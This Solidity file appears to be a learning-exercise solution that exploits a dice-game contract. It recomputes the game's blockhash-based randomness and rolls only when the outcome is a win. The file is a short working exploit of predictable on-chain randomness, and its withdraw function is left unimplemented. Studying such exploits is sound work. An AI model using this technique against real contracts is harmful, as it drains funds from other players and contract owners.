pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public payable onlyOwner {
        require(address(this).balance >= .002 ether, "need at least .002 ether brev");
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(this), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;
        console.log("THE PREVIOUS BLOCK NUMBER IS", block.number-1);
        console.log("THE ROLL IS ",roll);
        console.log("THE NONCE IS ", diceGame.nonce());
        require(roll<3, "roll ain't less than 3");
        diceGame.rollTheDice{value:msg.value}();
    }

    /*function invokeContractA() { 
        contractA a = contractA(0x1234567891234567891234567891234567891234);
        uint ValueToSend = 1234;
        a.blah{value: ValueToSend}(2, 3);
    } */


    //Add receive() function so contract can receive Eth
    receive() external payable {  

    }
    
}
